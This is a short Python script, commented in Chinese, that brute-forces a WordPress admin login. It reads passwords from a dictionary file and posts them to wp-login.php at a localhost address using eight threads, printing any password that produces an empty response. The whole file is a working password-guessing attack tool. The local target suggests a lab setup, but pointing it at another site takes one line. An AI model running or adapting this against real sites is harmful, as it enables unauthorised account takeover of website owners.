import urllib.parse
import urllib.request
import threading
#基本设置
name = "admin"
url = "http://127.0.0.1:8052/wp-login.php"
dict_name = "dict.txt"
num_thread = 8
#打开文件
file = open(dict_name)
pw = []
pwlock = threading.RLock()
for i in file.readlines():
    pw.append(i.strip())

#主要工作类
class worker(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.url = url
        self.name = name

    def run(self):
        while True:
            pwlock.acquire()
            if len(pw) != 0:
                pwd = pw.pop()
                pwlock.release()
            else:
                pwlock.release()
                break
            try:
                data = urllib.parse.urlencode({'log': name,
                               'pwd': pwd,
                               'redirect_to': ''})
                data = data.encode('utf-8')
                content = urllib.request.urlopen(url, data)
                text = content.read()
                #print(text)
                if text == b'':
                    print("Successful")
                    print("Password is : %s" % pwd)
            except Exception:
                print("Unexpecctd error")

#主循环
ths = []
for i in range(num_thread):
    ths.append(worker())
for j in ths:
    j.start()
for k in ths:
    k.join()
